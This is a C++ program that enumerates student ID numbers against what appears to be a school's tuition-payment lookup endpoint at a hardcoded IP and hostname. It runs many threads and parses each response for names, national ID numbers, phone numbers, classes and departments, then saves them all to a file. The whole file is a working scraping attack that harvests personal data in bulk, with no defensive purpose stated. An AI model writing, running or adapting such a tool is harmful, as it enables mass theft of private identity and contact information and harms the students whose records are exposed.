#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <cstdint>
#include <string>
#include <thread>
#include <valarray>
#include <algorithm>
#include <list>
#include <regex>

std::string Fuck(const char* ip, const uint16_t port, const int studentID)
{
	const auto sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	server.sin_addr.s_addr = inet_addr(ip);
	const socklen_t len = sizeof(struct sockaddr_in);
	connect(sock, (struct sockaddr*)&server, len);
	const auto sendBuf = (std::string(
			"POST /web/view/FreshmenPayTuitionFees.aspx/queryStudentByStuNo \
HTTP/1.1\r\nHost: lkdsyxywx.xcht.cc\r\nAccept : application / json, text / javas\
cript, */*; q=0.01\r\nX-Requested-With: XMLHttpRequest\r\nAccept-Language: zh-cn\
\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json; charset=UT\
F-8\r\nOrigin: http://lkdsyxywx.xcht.cc\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU \
iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/\
15E148 MicroMessenger/7.0.5(0x17000523) NetType/WIFI Language/zh_CN\r\nConnectio\
n: close\r\nReferer: http://lkdsyxywx.xcht.cc/web/view/FreshmenPayTuitionFees.as\
px\r\nContent-Length: 38\r\n\r\n{'jsonStr':'{\"studentID\":\"")
		+ std::to_string(studentID) + "\"}'}").c_str();
	const auto sendLen = strlen(sendBuf);
	write(sock, sendBuf, sendLen);
	char readBuf[1024] = {0};
	read(sock, readBuf, 1024);
	printf("%s", readBuf);
	close(sock);
	return std::string(readBuf);
}

void Write(FILE* fp, std::string str)
{
	fwrite(str.c_str(), sizeof(uint8_t), str.length(), fp);
}

int main(int argc, char* argv[])
{
	if (argc != 5)
	{
		fprintf(stderr, "%s startStudentID endStudentID(exclude) threadNum savePath\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	std::list<std::string> res(0);
	const auto startStudentID = strtol(argv[1], &argv[1], 10);
	const auto endStudentID = strtol(argv[2], &argv[2], 10);
	const auto threadNum = strtol(argv[3], &argv[3], 10);
	const auto count = endStudentID - startStudentID;
	const auto step = count / threadNum;
	std::valarray<std::thread> threads(threadNum);
	int id = 1;
	FILE* fp = fopen(argv[4], "wb");
	std::generate(begin(threads), end(threads), [&]() mutable
	{
		return std::thread([&]() mutable
		{
			const auto start = startStudentID + step * (id - 1);
			const auto end = threadNum == id ? endStudentID : start + step;
			const auto _id = id++;
			printf("thread %d(start=%d, end=%d) start.\n", _id, start, end);
			for (uint32_t i = start; i < end; i++)
			{
				auto s = Fuck("113.246.56.98", 80, i);
#define Json(key, json, sm) \
	std::regex_search(json, sm, std::regex("\\\\\""#key"\\\\\":(\\\\\".+?\\\\\"|null)")); \
	const auto (key) = std::regex_replace((sm)[0].str(), std::regex("(\\\\\""#key"\\\\\":|\\\\\")"), "")
				printf("%s\n", s.c_str());
				std::smatch sm;
				Json(XH, s, sm);
				Json(XM, s, sm);
				Json(XB, s, sm);
				Json(RXND, s, sm);
				Json(SFZH, s, sm);
				Json(BJMC, s, sm);
				Json(ZYMC, s, sm);
				Json(BMMC, s, sm);
				Json(phoneNo, s, sm);
				printf("%s|%s|%s|%s|%s|%s|%s|%s|%s\n", XH.c_str(), XM.c_str(), XB.c_str(), RXND.c_str(), SFZH.c_str(),
				       BJMC.c_str(), ZYMC.c_str(), BMMC.c_str(), phoneNo.c_str());
				fprintf(fp, "%s|%s|%s|%s|%s|%s|%s|%s|%s\n", XH.c_str(), XM.c_str(), XB.c_str(), RXND.c_str(),
				       SFZH.c_str(), BJMC.c_str(), ZYMC.c_str(), BMMC.c_str(), phoneNo.c_str());
			}
			printf("thread %d exit.\n", _id);
		});
	});
	for (auto& thread : threads) thread.join();
	fclose(fp);
}
